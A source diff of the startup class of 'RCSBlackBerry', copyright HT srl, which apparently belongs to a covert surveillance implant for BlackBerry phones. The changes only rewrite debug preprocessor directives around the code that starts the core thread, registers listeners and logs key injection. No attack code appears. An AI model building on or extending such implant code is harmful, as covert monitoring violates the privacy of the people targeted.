@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -8,9 +9,9 @@
  * *************************************************/
 package blackberry;
 
-import net.rim.device.api.system.Application;
+import net.rim.device.api.system.Application; 
 //#ifdef TEST
-import tests.MainTest;
+import tests.MainTest; 
 //#endif
 import blackberry.config.InstanceKeys323;
 import blackberry.config.Keys;
@@ -31,18 +32,18 @@ public class Main extends Application {
      *            the arguments
      */
     public static void main(final String[] args) {
-        //#mdebug
+        //#ifdef DEBUG
         if (args.length > 0) {
             System.out.println("Test");
             new MainTest();
         } else {
-            //#enddebug
+            //#endif
 
             new Main().enterEventDispatcher();
 
-            //#mdebug 
+            //#ifdef DEBUG 
         }
-        //#enddebug
+        //#endif
     }
 
     private final Debug debug;
@@ -68,8 +69,9 @@ public class Main extends Application {
         debug.info("RCSBlackBerry " + Version.getString());
 
         if (binaryPatched) {
-            // #debug
+            //#ifdef DEBUG
             debug.warn("Not binary patched, injecting 323");
+            //#endif
         }
 
         final Thread coreThread = new Thread(core);
@@ -83,8 +85,9 @@ public class Main extends Application {
      * 
      */
     public void startListeners() {
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("Starting Listeners");
+        //#endif
 
         addHolsterListener(appListener);
         addSystemListener(appListener);
@@ -94,8 +97,9 @@ public class Main extends Application {
      * 
      */
     public void stopListeners() {
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("Stopping Listeners");
+        //#endif
 
         removeHolsterListener(appListener);
         removeSystemListener(appListener);
